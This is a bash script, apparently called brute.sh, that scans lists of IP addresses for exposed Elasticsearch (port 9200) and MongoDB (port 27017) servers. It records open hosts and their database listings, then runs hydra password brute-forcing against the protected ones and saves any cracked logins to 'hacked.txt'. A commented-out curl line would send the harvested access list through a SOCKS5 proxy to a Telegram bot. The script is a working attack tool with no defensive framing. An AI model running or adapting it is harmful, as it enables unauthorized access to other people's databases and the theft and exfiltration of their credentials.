#!/bin/bash

tgkey=""
chat_id=""
proxy_ip=""
proxy_login=""
proxy_pass=""
proxy_port=""
port=$1
targets=$2
echo $1 $2
sleep 1

for pid in $(pidof -x brute.sh); do
    if [ $pid != $$ ]; then
        echo "[$(date)] : brute.sh : Process is already running with PID $pid"
        exit 1
    fi
done


   if [[ "$1" == "9200" ]] 

        then grep -Eo '([0-9]*\.){3}[0-9]*' $targets  | while read line
	do 

		if curl --max-time 3 -X GET "$line:9200/" | grep "You Know, for Search";
			then echo $line >> elastic.txt; 
			nmap $line -p$1 --script=elastic | grep "|">> elastic.txt
			sed -i "/$line/d" $targets

		else
		echo $line >> elastic_secured.txt;
		sed -i "/$line/d" $targets
		fi
	done

   fi



if [[ "$1" == "27017" ]];
        then grep -Eo '([0-9]*\.){3}[0-9]*' $targets | while read line
	do
	mdbstat=$(nmap $line -p$1 --script=mongodb-info.nse | grep -v codeName | grep code | awk {'print $4'})
	
		if  [[ "$mdbstat" == "13" ]]
			then echo $line >> mongo_secured.txt;
		else
        		echo $line >> mongodb.txt;
			nmap $line -p$1 --script=mongodb-databases.nse | grep "|">> mongodb.txt
		fi
	done
   fi


   if [[ "$1" == "9200" ]]

        then grep -Eo '([0-9]*\.){3}[0-9]*' elastic_secured.txt  | while read line
        do

                /opt/bin/hydra -L ./LOGINS -P ./PASSWORDS -f -V -s 9200 $line -o ./hacked.txt http-get /
                sed -i "/$line/d" $targets
        done

   fi

if [[ "$1" == "27017" ]];
        then grep -Eo '([0-9]*\.){3}[0-9]*' mongo_secured.txt | while read line
        do
			/opt/bin/hydra -L ./LOGINS -P ./PASSWORDS -f -V -s 27017 $line -o ./hacked.txt mongodb &&  sed -i "/$line/d" $targets

        done
fi



#grep -v "#" hacked.txt | tail > ./new_access.txt

#curl -v --socks5 $proxy_ip:$proxy_port -U $proxy_login:$proxy_pass -s --max-time 10 --retry 5 --retry-delay 2 --retry-max-time 10 https://api.telegram.org/bot$tgkey/sendDocument -F document=@new_access.txt -F "chat_id=$chat_id"


